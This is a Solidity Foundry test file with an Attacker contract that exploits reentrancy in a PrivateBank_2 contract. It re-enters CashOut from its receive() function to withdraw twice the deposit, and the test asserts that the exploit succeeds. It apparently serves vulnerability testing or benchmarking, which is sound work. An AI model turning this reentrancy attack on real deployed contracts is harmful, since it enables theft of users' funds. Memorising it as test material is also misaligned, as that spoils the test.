
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateBank_2, Log} from "../src/PrivateBank_2.sol";

contract TestReentrancyPrivateBank_2 is Test {

    PrivateBank_2 public bank;
    Attacker public _attacker;

    function setUp() public {
        Log lib = new Log();
        bank = new PrivateBank_2(address(lib));
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= bank.MinDeposit() && attackVal > 0 && attackVal <= type(uint128).max / 2);

        vm.deal(address(bank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank_2 public bank;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        bank = PrivateBank_2(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        attackAmount = val;
        bank.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        uint256 initialBalance = address(this).balance;
        uint256 initialRecorded = bank.balances(address(this));

        bank.CashOut(val);

        if (address(this).balance == initialBalance + 2 * val && bank.balances(address(this)) == initialRecorded) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            bank.CashOut(attackAmount);
        }
        revert();
    }
}
